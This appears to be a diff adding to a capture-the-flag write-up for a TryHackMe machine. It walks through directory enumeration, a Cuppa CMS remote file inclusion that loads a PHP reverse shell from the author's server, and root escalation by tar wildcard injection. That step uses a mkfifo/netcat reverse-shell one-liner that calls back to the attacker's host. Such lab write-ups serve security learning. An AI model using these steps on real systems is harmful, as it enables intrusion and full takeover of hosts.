@@ -300,5 +300,109 @@ body {
 </body>
 </html>
 ```
+It didnt look like anything special was on the first page. I ran gobuster against the site and found some more interesting directories to investigate. 
+```
+ajread@aj-ubuntu:~/TryHackMe/practice$ gobuster -u http://[REDACTED]/[REDACTED]/ -w /home/ajread/resources/wordlists/SecLists/Discovery/Web-Content/common.txt 
+
+=====================================================
+Gobuster v2.0.1              OJ Reeves (@TheColonial)
+=====================================================
+[+] Mode         : dir
+[+] Url/Domain   : http://[REDACTED]/[REDACTED]/
+[+] Threads      : 10
+[+] Wordlist     : /home/ajread/resources/wordlists/SecLists/Discovery/Web-Content/common.txt
+[+] Status codes : 200,204,301,302,307,403
+[+] Timeout      : 10s
+=====================================================
+2022/02/24 14:15:01 Starting gobuster
+=====================================================
+/.hta (Status: 403)
+/.htpasswd (Status: 403)
+/.htaccess (Status: 403)
+/administrator (Status: 301)
+/index.html (Status: 200)
+=====================================================
+2022/02/24 14:15:50 Finished
+=====================================================
+```
+When I navigated to the /administrator page, I was presented with a login screen for Cuppa CMS. I did some googling to find that there is a remote/local file inclusion vulnerability with Cuppa CMS (https://www.exploit-db.com/exploits/25971).
 # Initial Access
+With the LFI/RFI vulnerability, I set up a php reverse shell using pentest monkey (https://pentestmonkey.net/tools/web-shells/php-reverse-shell), changing the IP and port as needed. Then, I started a python http server on my local machine in the directory where the reverse shell is stored.
+```
+ajread@aj-ubuntu:~/resources/revshells$ sudo python -m http.server 80
+```
+I made sure to set up a netcat listener on my local machine. 
+```
+ajread@aj-ubuntu:~/TryHackMe/practice$ nc -lnvp 9999
+Listening on 0.0.0.0 9999
+```
+Then, I navigated to the LFI/RFI vulnerable location for the CMS and input the location of my local machine and grabbed the reverse shell.
+```
+http://[REDACTED]/[REDACTED]/administrator/alerts/alertConfigField.php?urlConfig=http://[REDACTED]:80/php-reverse-shell.php
+```
+And, it dropped me into a shell!
+```
+ajread@aj-ubuntu:~/TryHackMe/practice$ nc -lnvp 9999
+Listening on 0.0.0.0 9999
+Connection received on [REDACTED] 33456
+Linux skynet 4.8.0-58-generic #63~16.04.1-Ubuntu SMP Mon Jun 26 18:08:51 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
+ 13:28:52 up  1:09,  0 users,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+$ 
+```
+I could also see the machine call out to my local machine. 
+```
+ajread@aj-ubuntu:~/resources/revshells$ sudo python -m http.server 80
+[sudo] password for ajread: 
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+[REDACTED] - - [24/Feb/2022 14:28:51] "GET /php-reverse-shell.php HTTP/1.0" 200 -
+```
+Then, I was able to find the user flag.
+```
+$ wc -c user.txt
+33 user.txt
+```
 # Privilege Escalation 
+Within the home directory of milesdyson, there was an interesting backup file that is executed by root. 
+```
+www-data@skynet:/home/milesdyson/backups$ cat backup.sh
+cat backup.sh
+#!/bin/bash
+cd /var/www/html
+tar cf /home/milesdyson/backups/backup.tgz *
+```
+It looked like the shell script moves to the location of the website and compresses everything as a method of backup. I found this website that explains an exploit for tar using checkpoints(https://swepstopia.com/wildcards-tar-and-checkpoints/). According to the site, I first needed to create a shell script and place it in the location where the tar takes place. The shell script would call back to my local machine at a specific port. 
+```
+www-data@skynet:/var/www/html$ echo -n "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [REDACTED] 4444 >/tmp/f" > shell.sh
+<ifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [REDACTED] 4444 >/tmp/f" > shell.sh
+```
+Then, I had to set up a checkpoint action that would execute the shell script. 
+```
+www-data@skynet:/var/www/html$ touch "/var/www/html/--checkpoint-action=exec=sh shell.sh"
+<ml$ touch "/var/www/html/--checkpoint-action=exec=sh shell.sh"  
+```
+I set up a netcat listener to handle the shell script calling from the victim. 
+```
+ajread@aj-ubuntu:~/TryHackMe/$ nc -lnvp 4444
+Listening on 0.0.0.0 4444
+```
+Finally, I executed the checkpoint, which called the shell script. 
+```
+www-data@skynet:/var/www/html$ touch "/var/www/html/--checkpoint=1"
+touch "/var/www/html/--checkpoint=1"
+```
+My netcat listener picked up the call and I dropped into a shell with root privileges. 
+```
+ajread@aj-ubuntu:~/TryHackMe/$ nc -lnvp 4444
+Listening on 0.0.0.0 4444
+Connection received on 10.10.0.103 55152
+/bin/sh: 0: can't access tty; job control turned off
+# id
+uid=0(root) gid=0(root) groups=0(root)
+# wc -c /root/root.txt
+33 /root/root.txt
+```
